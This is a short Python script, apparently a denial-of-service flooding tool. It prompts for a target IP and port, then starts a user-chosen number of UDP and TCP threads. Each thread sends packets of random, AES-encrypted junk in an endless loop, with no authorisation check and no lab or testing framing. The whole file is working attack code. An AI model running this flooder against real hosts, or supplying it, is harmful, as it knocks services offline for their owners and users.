from scapy.all import *
from colorama import Fore, Style
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_random_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = pad(data, AES.block_size)
    return cipher.encrypt(padded_data)

def send_udp_packet(target_ip, target_port, packet_size, interval):
    while True:
        key = generate_random_data(16)  # Generate random 16-byte key for encryption
        combined_data = encrypt_data(generate_random_data(packet_size), key)
        try:
            send(IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=combined_data), verbose=False)
            print(f"{Fore.GREEN}Send UDP Packet To {Fore.RED}{target_ip}:{target_port}{Fore.WHITE}")
        except Exception as e:
            print(f"{Fore.WHITE}≽──────・EROR・──────≼")

        time.sleep(interval)

def send_tcp_packet(target_ip, target_port, packet_size, interval):
    while True:
        key = generate_random_data(16)  # Generate random 16-byte key for encryption
        combined_data = encrypt_data(generate_random_data(packet_size), key)
        try:
            send(IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=combined_data), verbose=False)
            print(f"{Fore.GREEN}Send TCP Packet To {Fore.RED}{target_ip}:{target_port}{Fore.WHITE}")
        except Exception as e:
            print(f"{Fore.WHITE}≽──────・EROR・──────≼")

        time.sleep(interval)

def main():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    packet_size = int(input("Enter packet size in bytes: "))
    interval = float(input("Enter interval between each packet (in seconds): "))
    udp_threads = int(input("Enter number of UDP threads: "))
    tcp_threads = int(input("Enter number of TCP threads: "))

    for _ in range(udp_threads):
        threading.Thread(target=send_udp_packet, args=(target_ip, target_port, packet_size, interval)).start()

    for _ in range(tcp_threads):
        threading.Thread(target=send_tcp_packet, args=(target_ip, target_port, packet_size, interval)).start()

if __name__ == "__main__":
    main()